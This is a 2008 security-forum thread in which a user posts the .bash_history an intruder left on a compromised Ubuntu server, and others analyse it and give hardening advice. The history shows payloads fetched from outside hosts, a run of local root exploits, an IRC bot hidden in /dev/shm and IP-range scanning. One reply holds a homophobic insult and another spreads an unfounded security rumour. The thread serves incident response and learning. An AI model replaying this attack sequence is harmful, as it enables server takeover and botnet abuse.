---
title: "My server was hacked"
date: 2008-12-10
forum: Security
---

### Post by tjajab on 2008-12-10
Hi,

my server got hacked by a hacker on a slightly outdated Hardy server who installed a botserver. The intruder came in by a mistake done by me by temporarily setting a user with sudo rights with easy enough credentials, and forgetting to remove the user.

Funny enough, the hacker left the .bash_history file of the particular user, and I would like to hear opinions from you. Should I output the contents here, or is there a risk that people uses it in a bad way? Could it be of any use?

I am planning to totally reinstall the server, and I already closed it from the Internet, but I would like to here from any expert who knows anything.

---

### Post by Sarmacid on 2008-12-10
You can post the bash history if you wanna know what he did but can't understand it on your own. Probably someone around here can explain.

Definitely wipe and reinstall.

---

### Post by Kinstonian on 2008-12-10
I'm not an expert, but it sounds like you've got it figured out for the most part.  The only things I can think of now (I was just leaving) is to make sure you have an idea for the scope of the incident.  Hopefully, and this is why I recommend Ubuntu users have firewalls with logging enabled-- hopefully you can check firewall logs for any inbound traffic from your hacked server, to its peers on the network.  I'd give a brief checkup to other computers that could be accessed by the attacker after compromising your server.  

You should also figure out how you can improve your prevntative, detective, and response measures to help secure your network in the future.  What mistakes have you made, and what could be done better in the future?

Also, now that you know how the incident occurred, and have fixed the hard (technical) vulnerability in the server, you should go back to your security policy and fix the soft (policy) vulnerability that allowed the incident to happen.  Either the policy wasn't adequate, or it wasn't being followed.  Regardless, that issue needs to be addressed.

---

### Post by Dr Small on 2008-12-10
I assume you are running OpenSSH Server?
Also, I should like to see the ~/.bash_history file.

---

### Post by tjajab on 2008-12-10
Okay, I hope I do not break any rules. Here is the .bash_history:
```

export PATH="."
sshd
exit
passwd
w
uname =-a
uname -a
cd /dev/shm
ls
mkdir ...
cd ...
wget
php -v
wget koko.freevar.com/bot.tgz
ftp koko.freevar.com
tar zxvf bot.tgz 
rm -rf v
rm -rf bot.tgz 
cd bot/
ls
mv start sshd
bash
w
cat /proc/cpuinfo
w
cd /dev/shm
ls
uname -a
cat /etc/issue
ls
cd ...
ls
wget risc.ucoz.com/x.txt
chmod +x x.txt
./x.txt
id
ls
rm -rf x.txt 
wget ciph.host.sk/26.tgz
tar zxvf 26.tgz 
rm -rf 26.tgz 
cd corekt/
ls
./execve-setreuid 
id
ls
./h00lyshit
./jt
id
ls
./kmex 
ls
./newlocal
./raptor
ls
./stackgrow2
./su
ls
./sxp
id
ls
./uselib24
id
ls
./w00t
cd ..
ls
rm -rf corekt/
ls
w
php -v
pwd
cat /proc/cpuinfo
ls
wget ciph.host.sk/s.jpg
tar zxvf s.jpg
rm -rf s.jpg 
cd ". "
ls
rm -rf php5-cli
./a 80.245
cd ..
ls
hostname -f
cat /etc/hosts
nano
w
cd /dev/shm/
ls
ls -all
mkdir " "
ls
ls -ñlall
ls -all
cd " "
ls
wget moshu,host.sk/emech.tgz
ftp 
ls
tar zxvf emech.tgz 
rm -rf emech.tgz 
cd koko/
ls
./pico 1
./pico 2
ls
rm -rf pico.tgz
./pico m.set 
ls
rm -rf pico 
ls
cd ..
ls
tar czvf emech.tgz koko
ls
ftp 
ls
rm -rf *
ls
cat /prc/cpuinfo
cat /proc/cpuinfo
ftp 
tar zxvf madmax.tgz 
rm -rf madmax.tgz 
cd superscan/
ls
./x 213.255
cd ..
ls
rm -rf superscan/
w
id
w
exit
w
uname -a
cd /dev/shm
ls
ps -x
ls -all
cd ". "
cd " !
cd " "
ls
ls -all
cd ..
cd ...
ls
ls -all
cd ". "
ls
./a 77.93
ls
cd /var/tmp/
ls
ls -all
mkdir ...
cd ...
ls
gcc
gcc -o
cd /var/tmp/
ls -all
cd ...
ls -all
wget moshu.host.sk/k.tgz
ls
rm -rf k.tgz.1 
tar zxvf k.tgz 
ls
rm -rf k.tgz 
wget moshu.host.sk/pico.tar
tar -zxvf pico.tar
rm -rf k.tgz pico.tar
ls
chmod +x *
./pico koko.c 
gcc
gcc -o koko.c koko
gcc -o koko koko.c
ls
rm ftp
ftp
ls
./pico koko.c 
ftp
ls
gcc
ls
./pico koko.c
rm -rf *
ftp 
ls
tar zxvf koko.tgz 
rm -rf koko.tgz 
ftp 
tar -zxvf pico.tar
rm -rf pico.tar
ls
./pico
./pico koko.c 
ls
ftp
ls
rm -rf *
gcc
g++
ls
cat /proc/cpuinfo
cd /dev/shm
ls
mkdir  ...
cd ...
ls
wget ciph.host.skj/s.jpg
ftp 62.168.109.153
tar zxvf s
tar zxvf s.jpg
rm -rf s.jpg
cd ". "
./a 62.168
cd /dev/shm
ls
cd ...
ls
cd ". "
ls
./a 80.245
cd ..
ls
wget bogghy.ucoz.org/lss.tgz
tar zxvf lss.tgz 
rm -rf lss.tgz 
cd lass
cd lss
ls
cat vuln.txt 
rm -rf vuln.txt 
rm -rf nobash.txt 
ls
pico a
ls
./a 80.245
chmod +x *
./a 80.245
./a 82.146
ls
cat nobash.txt
çrm -rf nobash.txt 
ls
./screen
nano screen 
sls
ls
./a 80.237
cd ..
ls
rm -rf lss
cd ". "
ls
rm -rf nobash 
./a 208.76
w
exit

```

---

### Post by Dr Small on 2008-12-10
Yeah, it definitely looks like someone, not a bot.
Best advice is to reinstall.

---

### Post by bodhi.zazen on 2008-12-10
Yikes, big ouch.

You have been cracked alright ;)

You may wish to report the incident.

This is an example of why we all need to become more aware of security and security issues.

Obviously, if you run a ssh server, I advise you use keys (and other methods) to secure the ssh server.

---

### Post by statethatiamin on 2008-12-10
You can tell it was a human (and not a bot) because he/she kept checking over their shoulder ( the "w" command ). You can also check the logs.

---

### Post by Dr Small on 2008-12-10
> **statethatiamin said:**
> You can tell it was a human (and not a bot) because he/she kept checking over their shoulder ( the "w" command ). You can also check the logs.
Yeah, I noticed that. A bot wouldn't care if it was caught (how could it?). A human whom has just cracked a server, would.

---

### Post by x3roconf on 2008-12-11
complete scriptkiddie nothing new

---

### Post by Sarmacid on 2008-12-11
From the > ls -ñlall

I'd say it's very likely he's using a spanish or latin american keyboard layout :o

---

### Post by Kinstonian on 2008-12-11
A big thing I forgot was I'm not sure if this is a work environment or your personal home server.  Quite a few states have laws requiring notification if personal data was compromised.  If this incident happened at work, then you might also need to make sure there wasn't any personal information on the hard drive that could have been compromised.

And just out of curiosity, how did you detect this incident?

---

### Post by jaynewstrom on 2008-12-11
Yes,
This was most deffinetely someone new, trying out some of the things they had just learned.
By no means a serious hacker.
So I don't think he was even looking for information from you luckly.

At least you didn't lose to much as it sounds.

---

### Post by technosinner on 2008-12-11
> **Kinstonian said:**
> Quite a few states have laws requiring notification if personal data was compromised.
True. Canada has Criminal Code and other Federal legislation against access of data, whether private or corporate.

However whereever you are, chances are law enforcement won't have the resources to investigate...

---

### Post by Kinstonian on 2008-12-11
> **technosinner said:**
> True. Canada has Criminal Code and other Federal legislation against access of data, whether private or corporate.

However whereever you are, chances are law enforcement won't have the resources to investigate...

That's good to know...  In the United States, it's becoming more common for states to require notification-- I believe primarily to the victims affected by the breach so they can take measures to mitigate damage resulting from the compromise of their personal information.

---

### Post by lavinog on 2008-12-11
I recently have learned about /dev/shm (ramdisk)
Interesting that they were using it and making folders like " " in it.
The user wouldn't see any disk access, or disk space used.
Thanks for the info...I will be sure to watch for anything in that folder.

---

### Post by Chayak on 2008-12-11
Thank you for posting the bash history.  I was able to collect the files your intruder was using.  I doubt it's anything really special as you could see the skiddie typing around.  Anyone with experience would have used a script to do it all and then wiped the history and logs.  That is the reason my servers dump their logs to a logging server.

---

### Post by go_beep_yourself on 2008-12-12
A bot wouldn't make typos either

---

### Post by TreeFinger on 2008-12-12
no ssh allowed from the outside on my network right now.

---

### Post by shqip on 2008-12-12
If you want safe access to your server use an advanced Web Shell program.

---

### Post by lavinog on 2008-12-12
> **shqip said:**
> The onlt safe SSH access at this moment is that of UNIX as far as i have been told.  If you are using Linux/Ubuntu HSS, It is considered to be a security risc and unsafe. If you want access to your server it is safe to use an advanced Web Shell program.   I am not 100 % sure though.

For what reason is Ubuntu SSH not safe?

---

### Post by shqip on 2008-12-12
> **lavinog said:**
> For what reason is Ubuntu SSH not safe?
I am not in a position to give you an answer to that. A Linux engineer would be able to answer that.  This is what I have been told by someone who knows a lot and is a security expert.

---

### Post by bodhi.zazen on 2008-12-12
IMO ssh servers should be "hardened" ie use keys, etc.

Otherwise , Linux uses open-ssh 

I can not see where it would be any more or less safe then Unix.

A link or additional proof would help.

---

### Post by lykwydchykyn on 2008-12-12
Probably he was referring to the Debian/Ubuntu ssh/openssl flaw discovered a few months back, which has since been patched.  Either that or he's a Solaris/AIX guy looking to spread FUD about Linux.:-P

---

### Post by x3roconf on 2008-12-12
> **lykwydchykyn said:**
> Probably he was referring to the Debian/Ubuntu ssh/openssl flaw discovered a few months back, which has since been patched.  Either that or he's a Solaris/AIX guy looking to spread FUD about Linux.:-P

or he is gay...

---

### Post by shqip on 2008-12-12
> **lykwydchykyn said:**
> Probably he was referring to the Debian/Ubuntu ssh/openssl flaw discovered a few months back, which has since been patched.  Either that or he's a Solaris/AIX guy looking to spread FUD about Linux.:-P
 I use Ubuntu and windows, but my main OS is Ubuntu,  and there is nothing wrong if the truth is being told whether you like it or not. i don't know much about OS architecture and systems. this is what i was told. If it makes you happy i can delete what i wrote and you can sleep safe

---

### Post by lykwydchykyn on 2008-12-12
> **shqip said:**
> i use ubuntu and windows, but my main OS is ubuntu,  and there is nothing wrong if the truth is being told whether you like it or not. i don't know much about OS systems. this is what i was told. If it makes you happy i can delete what i wrote and you can sleep safe

Exactly what truth are you telling?  I have no problem with "truth": example, there was a flaw a few months back affecting SSH in Debian and Ubuntu which limited the range of possible encryption keys allowing brute force attacks (probably how the OP got hacked, I'm guessing).  It's since been patched.  Yeah, Ubuntu has flaws, like every OS.  Even UNIX. 

As I pointed out, probably your "expert" was referring to this.  The second part was tongue-in-cheek humor (hence the smiley).

If you don't know what you're talking about, please don't spread unfounded rumors.

---

### Post by go_beep_yourself on 2008-12-12
You must of had a weak password for your system to get hacked or he/she could of been using Backtrack Linux with metasploit

---

### Post by lavinog on 2008-12-13
Maybe w could be renamed to something else and in its place put something that emails you that someone is snooping around. You can then have the pseudo w inform the attacker that you were notified about their presence.

although notifying the attacker might push them to be more malicious than they were intending.

---

### Post by pshootr on 2008-12-13
> **TreeFinger said:**
> no ssh allowed from the outside on my network right now.

Please tell me how you accomplish this. Thanks

---

### Post by go_beep_yourself on 2008-12-13
> **pshootr said:**
> Please tell me how you accomplish this. Thanks

Easy, don't enable port forwarding. Also with Firestarter, you can control who can and cannot access your computer. You can even restrict to only allow ssh connections from certain ip addresses.

---

### Post by pshootr on 2008-12-13
> **go_beep_yourself said:**
> Easy, don't enable port forwarding. Also with Firestarter, you can control who can and cannot access your computer. You can even restrict to only allow ssh connections from certain ip addresses.

firestarter is good for servers eh?

I take it port forwarding is disabled by default?

Actually if you don't mind, please take a look at another thread I started. [http://ubuntuforums.org/showthread.php?t=1009813](http://ubuntuforums.org/showthread.php?t=1009813)

---

### Post by The Cog on 2008-12-13
I think go_beep_yourself means the router is nor forwarding SSH to the computer.

And I have read a few times here that firestarter is no longer maintained.

---

